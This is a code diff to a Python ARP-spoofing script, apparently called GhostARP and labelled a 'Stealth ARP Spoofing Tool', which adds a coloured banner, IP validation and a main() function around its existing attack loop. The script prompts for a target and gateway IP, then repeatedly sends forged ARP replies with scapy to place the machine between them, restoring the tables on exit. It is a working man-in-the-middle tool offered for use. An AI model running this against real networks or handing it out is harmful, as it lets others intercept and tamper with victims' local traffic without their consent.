@@ -1,11 +1,25 @@
-#!/usr/bin/env python
-
-from banner.ghostbanner import *
-# from termcolor import colored
 import scapy.all as scapy
 import time
+import re
+from colorama import init, Fore, Style
 
+# Initialize Colorama
+init()
 
+# Banner with Coordinated Bright Colors
+banner = f"""
+{Style.BRIGHT}{Fore.RED}                   ________.__                    __     _____ ____________________ 
+{Style.BRIGHT}{Fore.BLUE}                  /  _____/|  |__   ____  _______/  |_  /  _  \\______   \\______   \\
+{Style.BRIGHT}{Fore.GREEN}                 /   \\  ___|  |  \\ /  _ \\/  ___/\\   __\\/  /_\\  \\|       _/|     ___/
+{Style.BRIGHT}{Fore.YELLOW}                 \\    \\_\\  \\   Y  (  <_> )___ \\  |  | /    |    \\    |   \\|    |    
+{Style.BRIGHT}{Fore.RED}                  \\______  /___|  /\\____/____  > |__| \\____|__  /____|_  /|____|    
+{Style.BRIGHT}{Fore.RED}                         \\/     \\/           \\/               \\/       \\/                    
+{Style.BRIGHT}{Fore.CYAN}                                ---- Stealth ARP Spoofing Tool ----
+{Style.BRIGHT}{Fore.YELLOW}                 ===================================================================
+{Style.BRIGHT}{Fore.YELLOW}                                𝕍𝕖𝕣𝕤𝕚𝕠𝕟 : 1.0     𝕋𝕨𝕚𝕥𝕥𝕖𝕣 : anishalx7        
+{Style.BRIGHT}{Fore.YELLOW}                 ===================================================================    
+{Style.RESET_ALL}
+"""
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
@@ -36,25 +50,44 @@ def restore(destination_ip, source_ip):
     packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
     scapy.send(packet, count=4, verbose=False)
 
-# Ask the user for target and gateway IPs
-try:
-    target_ip = input("Enter Target IP: ")
-    gateway_ip = input("Enter Gateway IP: ")
-except KeyboardInterrupt:
-    print("\n[!] Script interrupted by user. Exiting gracefully.")
-    exit()
+def is_valid_ip(ip):
+    pattern = r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$"
+    return re.match(pattern, ip) is not None
 
-sent_packets_count = 0
-try:
+def main():
+    print(banner)  # Print the banner
+
+    # Ask the user for target and gateway IPs with validation
     while True:
-        spoof(target_ip, gateway_ip)
-        spoof(gateway_ip, target_ip)
-        sent_packets_count += 2
-        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
-        time.sleep(2)
-except KeyboardInterrupt:
-    print("\n[+] Detected Ctrl + C ....... Resetting ARP tables... Please wait.")
-    restore(target_ip, gateway_ip)
-    restore(gateway_ip, target_ip)
-    print("[+] ARP tables restored. Exiting.")
+        try:
+            target_ip = input("Enter Target IP: ")
+            if not is_valid_ip(target_ip):
+                print(f"[!] Invalid IP address: {target_ip}. Please enter a valid IPv4 address.")
+                continue
+            
+            gateway_ip = input("Enter Gateway IP: ")
+            if not is_valid_ip(gateway_ip):
+                print(f"[!] Invalid IP address: {gateway_ip}. Please enter a valid IPv4 address.")
+                continue
 
+            break  # Exit the loop if both IPs are valid
+        except KeyboardInterrupt:
+            print("\n[!] Script interrupted by user. Exiting gracefully.")
+            return
+
+    sent_packets_count = 0
+    try:
+        while True:
+            spoof(target_ip, gateway_ip)
+            spoof(gateway_ip, target_ip)
+            sent_packets_count += 2
+            print("\r[+] Packets sent: " + str(sent_packets_count), end="")
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print("\n[+] Detected Ctrl + C ....... Resetting ARP tables... Please wait.")
+        restore(target_ip, gateway_ip)
+        restore(gateway_ip, target_ip)
+        print("[+] ARP tables restored. Exiting.")
+
+if __name__ == "__main__":
+    main()
